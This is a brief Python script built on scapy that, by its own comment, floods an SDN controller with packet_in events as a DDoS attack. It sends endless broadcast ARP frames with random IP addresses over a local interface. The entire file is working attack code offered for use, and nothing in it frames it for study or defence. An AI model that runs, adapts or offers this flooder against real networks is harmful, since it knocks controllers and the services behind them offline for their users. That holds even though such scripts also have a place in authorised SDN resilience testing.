#! /usr/bin/env python
# Script to inject packet_in in a controller to produce a DDoS attack
# Requires an real IP in the network
# Args 1. DstIP 
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.l2 import ARP
import sys

ifs=os.listdir('/sys/class/net/')
ifa = ifs[1]
r=RandMAC()._fix()
while (True):
    packet =Ether(dst='ff:ff:ff:ff:ff:ff',src=r,type=0x0806)/ARP(
        hwsrc= r,psrc= RandIP(),pdst=RandIP())
    sendp(packet, count=10000,iface=ifa)

